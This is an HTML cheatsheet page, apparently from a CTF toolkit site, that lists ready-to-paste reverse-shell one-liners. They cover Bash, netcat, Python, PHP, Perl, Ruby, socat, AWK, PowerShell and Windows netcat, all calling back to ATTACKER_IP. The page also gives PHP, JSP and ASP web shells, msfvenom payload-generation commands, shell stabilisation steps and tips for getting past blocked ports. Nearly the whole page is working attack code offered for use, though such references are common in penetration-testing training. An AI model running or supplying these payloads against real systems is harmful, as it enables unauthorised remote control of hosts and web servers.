<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reverse Shell Cheatsheet | CTF Toolkit 2025</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0d1117;
            color: #c9d1d9;
            line-height: 1.8;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 2rem;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }
        .header h1 { color: white; font-size: 2.5rem; }
        .back-link {
            display: inline-block;
            color: white;
            text-decoration: none;
            margin-bottom: 1rem;
            opacity: 0.9;
        }
        .back-link:hover { opacity: 1; }
        .container { max-width: 1200px; margin: 2rem auto; padding: 0 2rem; }
        h2 {
            color: #58a6ff;
            margin: 2rem 0 1rem 0;
            padding-bottom: 0.5rem;
            border-bottom: 2px solid #30363d;
        }
        h3 { color: #79c0ff; margin: 1.5rem 0 0.5rem 0; }
        p { margin-bottom: 1rem; }
        code {
            background: #161b22;
            padding: 0.2rem 0.4rem;
            border-radius: 3px;
            color: #79c0ff;
            font-family: 'Courier New', monospace;
        }
        pre {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 1rem;
            overflow-x: auto;
            margin: 1rem 0;
            position: relative;
        }
        pre code { background: none; padding: 0; }
        .copy-btn {
            position: absolute;
            top: 0.5rem;
            right: 0.5rem;
            background: #238636;
            color: white;
            border: none;
            padding: 0.3rem 0.8rem;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.85rem;
        }
        .copy-btn:hover { background: #2ea043; }
        .info-box {
            background: #1f6feb20;
            border-left: 4px solid #1f6feb;
            padding: 1rem;
            margin: 1rem 0;
            border-radius: 4px;
        }
        .warning-box {
            background: #ffc10720;
            border-left: 4px solid #ffc107;
            padding: 1rem;
            margin: 1rem 0;
            border-radius: 4px;
        }
        .success-box {
            background: #23863620;
            border-left: 4px solid #238636;
            padding: 1rem;
            margin: 1rem 0;
            border-radius: 4px;
        }
        ul, ol { margin-left: 2rem; margin-bottom: 1rem; }
        li { margin-bottom: 0.5rem; }
        .language-tag {
            display: inline-block;
            background: #238636;
            color: white;
            padding: 0.2rem 0.6rem;
            border-radius: 12px;
            font-size: 0.85rem;
            margin-bottom: 0.5rem;
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="../index.html" class="back-link">‚Üê Back to Home</a>
        <h1>üêö Reverse Shell Cheatsheet</h1>
        <p style="color: white; opacity: 0.9;">One-liners for every language and scenario</p>
    </div>

    <div class="container">
        <div class="info-box">
            <strong>Setup First:</strong> Always start your listener before executing the reverse shell!
            <pre><code># Netcat listener
nc -lvnp 4444

# Or with rlwrap for better shell
rlwrap nc -lvnp 4444</code></pre>
        </div>

        <div class="warning-box">
            <strong>‚ö†Ô∏è Remember:</strong> Replace <code>ATTACKER_IP</code> with your IP and <code>PORT</code> with your listener port!
        </div>

        <h2>üêß Linux Reverse Shells</h2>

        <h3><span class="language-tag">Bash</span> TCP</h3>
        <pre><code>bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1</code></pre>

        <h3><span class="language-tag">Bash</span> Alternative</h3>
        <pre><code>bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'</code></pre>

        <h3><span class="language-tag">Netcat</span> Traditional</h3>
        <pre><code># With -e flag
nc -e /bin/bash ATTACKER_IP PORT

# Without -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f</code></pre>

        <h3><span class="language-tag">Netcat</span> OpenBSD</h3>
        <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f</code></pre>

        <h3><span class="language-tag">Python</span> IPv4</h3>
        <pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>

        <h3><span class="language-tag">Python3</span> IPv4</h3>
        <pre><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</code></pre>

        <h3><span class="language-tag">PHP</span> exec</h3>
        <pre><code>php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>

        <h3><span class="language-tag">PHP</span> shell_exec</h3>
        <pre><code>php -r '$sock=fsockopen("ATTACKER_IP",PORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>

        <h3><span class="language-tag">PHP</span> system</h3>
        <pre><code>php -r '$sock=fsockopen("ATTACKER_IP",PORT);system("/bin/sh -i <&3 >&3 2>&3");'</code></pre>

        <h3><span class="language-tag">Perl</span></h3>
        <pre><code>perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code></pre>

        <h3><span class="language-tag">Ruby</span></h3>
        <pre><code>ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</code></pre>

        <h3><span class="language-tag">Socat</span></h3>
        <pre><code>socat tcp-connect:ATTACKER_IP:PORT exec:/bin/bash,pty,stderr,setsid,sigint,sane</code></pre>

        <h3><span class="language-tag">AWK</span></h3>
        <pre><code>awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null</code></pre>

        <h2>ü™ü Windows Reverse Shells</h2>

        <h3><span class="language-tag">PowerShell</span> One-Liner</h3>
        <pre><code>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>

        <h3><span class="language-tag">PowerShell</span> Base64 Encoded</h3>
        <pre><code># First encode your PowerShell payload
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Then execute
powershell -encodedCommand [BASE64_PAYLOAD]</code></pre>

        <h3><span class="language-tag">CMD</span> PowerShell</h3>
        <pre><code>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>

        <h3><span class="language-tag">Netcat</span> Windows</h3>
        <pre><code>nc.exe -e cmd.exe ATTACKER_IP PORT</code></pre>

        <h2>üåê Web Shell Reverse Shells</h2>

        <h3><span class="language-tag">PHP</span> Web Shell</h3>
        <pre><code>&lt;?php
$sock = fsockopen("ATTACKER_IP", PORT);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?&gt;</code></pre>

        <h3><span class="language-tag">JSP</span> Web Shell</h3>
        <pre><code>&lt;%
    String host="ATTACKER_IP";
    int port=PORT;
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
%&gt;</code></pre>

        <h3><span class="language-tag">ASP</span> Web Shell</h3>
        <pre><code>&lt;%
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell -c ""$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
%&gt;</code></pre>

        <h2>üîß Shell Stabilization (Linux)</h2>

        <div class="success-box">
            <strong>Upgrade to TTY Shell:</strong>
        </div>

        <h3>Method 1: Python PTY</h3>
        <pre><code># In reverse shell
python -c 'import pty;pty.spawn("/bin/bash")'
# or
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Then background the shell
Ctrl+Z

# In your terminal
stty raw -echo; fg

# In reverse shell
export TERM=xterm
export SHELL=bash</code></pre>

        <h3>Method 2: Script Command</h3>
        <pre><code>/usr/bin/script -qc /bin/bash /dev/null</code></pre>

        <h3>Method 3: Socat (Advanced)</h3>
        <pre><code># On attacker machine
socat file:`tty`,raw,echo=0 tcp-listen:PORT

# On victim (requires socat)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT</code></pre>

        <h2>üéØ MSFvenom Payloads</h2>

        <h3>Linux ELF Binary</h3>
        <pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf</code></pre>

        <h3>Windows EXE</h3>
        <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell.exe</code></pre>

        <h3>PHP Shell</h3>
        <pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.php</code></pre>

        <h3>WAR (Java)</h3>
        <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f war > shell.war</code></pre>

        <h3>ASP</h3>
        <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f asp > shell.asp</code></pre>

        <h2>üí° Pro Tips</h2>

        <div class="info-box">
            <h3>Always Try These First:</h3>
            <ol>
                <li><strong>Bash:</strong> <code>bash -i >& /dev/tcp/IP/PORT 0>&1</code></li>
                <li><strong>Python:</strong> Usually available on Linux</li>
                <li><strong>Netcat:</strong> Check with <code>which nc</code></li>
                <li><strong>PowerShell:</strong> Default on Windows</li>
            </ol>
        </div>

        <div class="warning-box">
            <strong>Troubleshooting:</strong>
            <ul>
                <li><strong>Connection refused?</strong> Check firewall and verify your IP</li>
                <li><strong>Shell dies immediately?</strong> Try URL encoding special characters</li>
                <li><strong>No TTY?</strong> Use Python PTY upgrade method</li>
                <li><strong>Blocked port?</strong> Try common ports: 80, 443, 53, 8080</li>
            </ul>
        </div>

        <h2>üîó Additional Resources</h2>

        <ul>
            <li><a href="https://www.revshells.com/" target="_blank" style="color: #58a6ff;">RevShells.com - Interactive Generator</a></li>
            <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" style="color: #58a6ff;">PayloadsAllTheThings</a></li>
            <li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" style="color: #58a6ff;">PentestMonkey Reverse Shell Cheatsheet</a></li>
        </ul>

        <a href="../index.html" class="back-link" style="color: #58a6ff; margin-top: 2rem; display: inline-block;">‚Üê Back to Home</a>
    </div>
</body>
</html>
